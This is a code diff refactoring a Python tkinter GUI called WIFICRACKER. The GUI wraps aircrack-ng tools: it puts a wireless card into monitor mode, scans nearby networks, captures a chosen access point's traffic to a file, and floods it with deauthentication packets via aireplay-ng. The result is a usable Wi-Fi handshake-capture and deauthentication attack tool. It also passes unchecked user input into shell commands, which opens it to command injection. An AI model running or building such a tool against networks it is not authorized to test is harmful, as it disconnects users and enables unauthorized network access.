@@ -1,5 +1,5 @@
 import tkinter as tk
-import subprocess
+from subprocess import Popen, PIPE
 
 class wificracker(tk.Frame):
     def __init__(self, master=None):
@@ -17,7 +17,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=20,
         )
-        self.title.pack()
+        self.title.grid(row=0, column=0, columnspan=2)
 
         self.instructions = tk.Label(
             self.master,
@@ -27,7 +27,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=10,
         )
-        self.instructions.pack()
+        self.instructions.grid(row=1, column=0, columnspan=2)
 
         self.interface_label = tk.Label(
             self.master,
@@ -37,7 +37,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=10,
         )
-        self.interface_label.pack()
+        self.interface_label.grid(row=2, column=0)
 
         self.interface_input = tk.Entry(
             self.master,
@@ -47,7 +47,7 @@ class wificracker(tk.Frame):
             bg="#2C2C32",
             font=("Courier", 14),
         )
-        self.interface_input.pack(pady=10)
+        self.interface_input.grid(row=3, column=0, pady=10)
 
         self.scan_button = tk.Button(
             self.master,
@@ -60,7 +60,7 @@ class wificracker(tk.Frame):
             pady=10,
             command=self.scan_networks,
         )
-        self.scan_button.pack(pady=10)
+        self.scan_button.grid(row=4, column=0, pady=10)
 
         self.output_label = tk.Label(
             self.master,
@@ -70,7 +70,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=10,
         )
-        self.output_label.pack()
+        self.output_label.grid(row=5, column=0)
 
         self.output = tk.Text(
             self.master,
@@ -81,38 +81,9 @@ class wificracker(tk.Frame):
             borderwidth=2,
             font=("Courier", 14),
         )
-        self.output.pack(padx=20)
+        self.output.grid(row=6, column=0, padx=20)
 
-    def scan_networks(self):
-        interface = self.interface_input.get()
-        command = f"sudo airmon-ng check kill && sudo airmon-ng start {interface} && timeout 5s sudo airodump-ng {interface}mon" #ПОПРОБОВАТЬ TIMEOUT С SUDO!!!!!!!!!!!!
-        process = subprocess.Popen(
-            command,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            shell=True,
-        )
-    
-        try:
-            # Выводим результаты в режиме реального времени
-            for line in iter(process.stdout.readline, b''):
-                self.output.insert(tk.END, line.decode())
-    
-        except KeyboardInterrupt:
-            # Обрабатываем прерывание через ctrl+c
-            process.kill()
-    
-        finally:
-            output, error = process.communicate()
-            if error:
-                self.output.insert(tk.END, f"Error:\n\n{error.decode()}")
-            else:
-                self.output.insert(tk.END, f"Output:\n\n{output.decode()}")
-    
-        self.instructions.destroy()
-        self.interface_input.destroy()
-        self.scan_button.destroy()
-    
+    def create_second_step_widgets(self):
         self.instructions2 = tk.Label(
             self.master,
             text="Select the target network's MAC address, then enter the channel,\nthen click Capture below:",
@@ -121,7 +92,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=10,
         )
-        self.instructions2.pack()
+        self.instructions2.grid(row=1, column=0, columnspan=2)
 
         self.target_label = tk.Label(
             self.master,
@@ -131,7 +102,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=10,
         )
-        self.target_label.pack()
+        self.target_label.grid(row=2, column=0)
 
         self.target_input = tk.Entry(
             self.master,
@@ -141,7 +112,7 @@ class wificracker(tk.Frame):
             bg="#2C2C32",
             font=("Courier", 14),
         )
-        self.target_input.pack(pady=10)
+        self.target_input.grid(row=3, column=0, pady=10)
 
         self.channel_label = tk.Label(
             self.master,
@@ -151,7 +122,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=10,
         )
-        self.channel_label.pack()
+        self.channel_label.grid(row=4, column=0)
 
         self.channel_input = tk.Entry(
             self.master,
@@ -161,7 +132,7 @@ class wificracker(tk.Frame):
             bg="#2C2C32",
             font=("Courier", 14),
         )
-        self.channel_input.pack(pady=10)
+        self.channel_input.grid(row=5, column=0, pady=10)
 
         self.path_label = tk.Label(
             self.master,
@@ -171,7 +142,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=10,
         )
-        self.path_label.pack()
+        self.path_label.grid(row=6, column=0)
 
         self.path_input = tk.Entry(
             self.master,
@@ -181,7 +152,7 @@ class wificracker(tk.Frame):
             bg="#2C2C32",
             font=("Courier", 14),
         )
-        self.path_input.pack(pady=10)
+        self.path_input.grid(row=7, column=0, pady=10)
 
         self.dist_label = tk.Label(
             self.master,
@@ -191,7 +162,7 @@ class wificracker(tk.Frame):
             bg="#1A1A1D",
             pady=10,
         )
-        self.dist_label.pack()
+        self.dist_label.grid(row=8, column=0)
 
         self.dist_input = tk.Entry(
             self.master,
@@ -201,7 +172,7 @@ class wificracker(tk.Frame):
             bg="#2C2C32",
             font=("Courier", 14),
         )
-        self.dist_input.pack(pady=10)
+        self.dist_input.grid(row=9, column=0, pady=10)
 
         self.capture_button = tk.Button(
             self.master,
@@ -214,33 +185,59 @@ class wificracker(tk.Frame):
             pady=10,
             command=self.capture,
         )
-        self.capture_button.pack(pady=10)
+        self.capture_button.grid(row=10, column=0, pady=10)
+
+    def scan_networks(self):
+        interface = self.interface_input.get()
+        command = f"sudo airmon-ng check kill && sudo airmon-ng start {interface} && timeout 5s sudo airodump-ng {interface}mon"
+        process = Popen(
+            command,
+            stdout=PIPE,
+            stderr=PIPE,
+            shell=True,
+        )
+
+        for line in iter(process.stdout.readline, b''):
+            self.output.insert(tk.END, line.decode())
+
+        exit_code = process.wait()
+        if exit_code != 0:
+            error = process.stderr.read().decode()
+            self.output.insert(tk.END, f"Error:\n\n{error}")
+        else:
+            output = process.stdout.read().decode()
+            self.output.insert(tk.END, f"Output:\n\n{output}")
+
+        self.instructions.grid_forget()
+        self.interface_input.grid_forget()
+        self.scan_button.grid_forget()
+
+        self.create_second_step_widgets()
 
     def capture(self):
         interface = self.interface_input.get()
         bssid = self.target_input.get()
         channel = self.channel_input.get()
         path = self.path_input.get()
-        dist = self.dist_input.get()
-
-        if not dist:
-            dist = "0"
+        dist = self.dist_input.get() or "0"
 
         command = f"sudo airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | sudo aireplay-ng -0 {dist} -a {bssid} {interface}"
-        process = subprocess.Popen(
+        process = Popen(
             ["/bin/bash", "-c", command],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
+            stdout=PIPE,
+            stderr=PIPE,
             shell=False,
         )
+
         output, error = process.communicate()
         if error:
             self.output.insert(tk.END, f"Error:\n\n{error.decode()}")
         else:
             self.output.insert(tk.END, f"Output:\n\n{output.decode()}")
-        
+
 root = tk.Tk()
 root.title("WIFICRACKER")
 app = wificracker(master=root)
 app.mainloop()
+
 
